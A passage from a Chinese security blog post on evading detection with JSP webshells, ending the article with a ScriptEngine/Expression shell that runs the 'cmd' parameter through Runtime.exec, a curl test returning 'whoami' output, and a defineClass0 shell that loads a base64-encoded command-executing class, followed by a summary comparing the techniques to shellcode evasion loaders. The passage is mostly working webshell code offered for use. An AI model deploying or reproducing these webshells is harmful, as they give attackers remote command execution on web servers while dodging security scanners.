class="string">&quot;JavaScript&quot;</span>);</span><br><span class="line">    scriptEngine.put(<span class="string">&quot;request&quot;</span>, request);</span><br><span class="line">    scriptEngine.eval(jsCode);</span><br><span class="line">    InputStream inputStream = (InputStream) scriptEngine.eval(jsCode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    Expression expr = <span class="keyword">new</span> Expression(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Object[]&#123;cmd&#125;);</span><br><span class="line">    Process process = (Process) expr.getValue();</span><br><span class="line">    InputStream in = process.getInputStream();</span><br><span class="line"></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    InputStreamReader resultReader = <span class="keyword">new</span> InputStreamReader(in);</span><br><span class="line">    BufferedReader stdInput = <span class="keyword">new</span> BufferedReader(resultReader);</span><br><span class="line">    String s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">while</span> ((s=stdInput.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        sb.append(s).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    response.getWriter().print(sb.toString());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[shadowflow@ShadowOS ~]% curl http:<span class="regexp">//</span>localhost:<span class="number">8080</span><span class="regexp">/jspshell_war/</span>scriptEngine.jsp\?cmd\=whoami</span><br><span class="line">shadowflow</span><br></pre></td></tr></table></figure>



<h2 id="12-Native方法defineClass0"><a href="#12-Native方法defineClass0" class="headerlink" title="12. Native方法defineClass0"></a>12. Native方法defineClass0</h2><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.security.ProtectionDomain&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;com.sun.org.apache.xml.internal.security.utils.Base64&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">byte</span>[] code = Base64.decode(<span class="string">&quot;yv66vgAAADQATgoAEQAsBwAtCgACACwKAC4ALwoALgAwBwAxBwAyCgAzADQKAAcANQoABgA2CgAGADcKAAIAOAgAOQoAAgA6CQAQADsHADwHAD0BAANyZXMBABJMamF2YS9sYW5nL1N0cmluZzsBAAY8aW5pdD4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxFeHA7AQADY21kAQANc3RyaW5nQnVpbGRlcgEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAZyZWFkZXIBABhMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBAARsaW5lAQANU3RhY2tNYXBUYWJsZQcAPAcAPgcALQcAMQEACkV4Y2VwdGlvbnMHAD8BAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAUAEABABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgcAQQwAQgBDDABEAEUBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgcARgwARwBIDAAUAEkMABQASgwASwApDABMAE0BAAEKDAAoACkMABIAEwEAA0V4cAEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAAygpVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABMoTGphdmEvaW8vUmVhZGVyOylWAQAIcmVhZExpbmUBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsAIQAQABEAAAABAAAAEgATAAAAAgABABQAFQACABYAAADeAAYABQAAAE8qtwABuwACWbcAA024AAQrtgAFV7sABlm7AAdZuAAEK7YABbYACLcACbcACk4ttgALWToExgASLBkEtgAMEg22AAxXp//qKiy2AA61AA+xAAAAAwAXAAAAIgAIAAAABgAEAAcADAAIABQACQAtAAsANwAMAEYADgBOAA8AGAAAADQABQAAAE8AGQAaAAAAAABPABsAEwABAAwAQwAcAB0AAgAtACIAHgAfAAMANAAbACAAEwAEACEAAAAbAAL/AC0ABAcAIgcAIwcAJAcAJQAA/AAYBwAjACYAAAAEAAEAJwABACgAKQABABYAAAAvAAEAAQAAAAUqtAAPsAAAAAIAFwAAAAYAAQAAABIAGAAAAAwAAQAAAAUAGQAaAAAAAQAqAAAAAgAr&quot;</span>);</span><br><span class="line">    <span class="comment">//Proxy.class.getDeclaredMethod(&quot;defineClass0&quot;, ClassLoader.class, String.class, byte[].class, int.class, int.class);</span></span><br><span class="line">    ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span><br><span class="line">    Method method = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class, ProtectionDomain.class);</span><br><span class="line">    method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, <span class="string">&quot;Exp&quot;</span>, code, <span class="number">0</span>, code.length, <span class="keyword">null</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    Object object = constructor.newInstance(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    response.getWriter().println(object.toString());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意：只能执行成功一次</p>
<h2 id="13-总结"><a href="#13-总结" class="headerlink" title="13. 总结"></a>13. 总结</h2><p>反射方式是通过<code>Class.forName()</code>获取Runtime对象，然后传入参数执行。</p>
<p>随机数方式是通过随机生成字符拼接成想要的类名或者方法名，达到欺骗的效果。</p>
<p>BeansExpression是通过通过<code>java.beans.Expression</code>来执行<code>getRuntime()</code></p>
<p>其他的，BCEL、自定义ClassLoader、动态编译、ScriptEngine、Native方法的原理都差不多，都是通过加载字节码来执行，不同的就是各种花哨的加载器，就像做shellcode的免杀，都是通过各种加载器来执行机器马，所以本质上各种攻击场景都是有想通之处。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10507">https://xz.aliyun.com/t/10507</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/threedr3am/JSP-Webshells">https://github.com/threedr3am/JSP-Webshells</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://space.bilibili.com/1106751850/channel/seriesdetail?sid=560683">https://space.bilibili.com/1106751850/channel/seriesdetail?sid=560683</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p>
</li>
</ul>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%85%8D%E6%9D%80/" rel="tag"># 免杀</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/%E5%AE%B9%E5%99%A8%E4%BA%91%E6%94%BB%E9%98%B2%E4%BD%93%E7%B3%BB%E4%BB%8B%E7%BB%8D/" rel="prev" title="容器云攻防体系介绍">
      <i class="fa fa-chevron-left"></i> 容器云攻防体系介绍
    </a></div>
      <div class="post-nav-item">
    <a href="/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%8F%8D%E5%B0%84/" rel="next" title="java类加载机制与反射">
      java类加载机制与反射 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-JSP%E6%B5%85%E6%9E%90"><span class="nav-text">1. JSP浅析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E6%9E%84%E5%BB%BAwebshell%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-text">2. 构建webshell测试环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E9%A9%AC%E6%B5%8B%E8%AF%95"><span class="nav-text">3. 最简单的马测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-base64%E9%A9%AC"><span class="nav-text">4. base64马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E5%8F%8D%E5%B0%84%E6%96%B9%E5%BC%8F"><span class="nav-text">5. 反射方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%88%A9%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8F%AF%E7%9F%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87"><span class="nav-text">6. 利用随机数运行时可知字符串绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-BCEL%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84JSP"><span class="nav-text">7. BCEL字节码的JSP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E8%87%AA%E5%AE%9A%E4%B9%89ClassLoader"><span class="nav-text">8. 自定义ClassLoader</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-BeansExpression"><span class="nav-text">9. BeansExpression</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E5%8A%A8%E6%80%81%E7%BC%96%E8%AF%91"><span class="nav-text">10. 动态编译</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-ScriptEngine"><span class="nav-text">11. ScriptEngine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Native%E6%96%B9%E6%B3%95defineClass0"><span class="nav-text">12. Native方法defineClass0</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-%E6%80%BB%E7%BB%93"><span class="nav-text">13. 总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Rune"
      src="/images/touxiang.jpeg">
  <p class="site-author-name" itemprop="name">Rune</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">56</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">36</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/vinci-3000" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;vinci-3000" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/Vinci_YNM3000" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Vinci_YNM3000" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Rune</span>
</div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
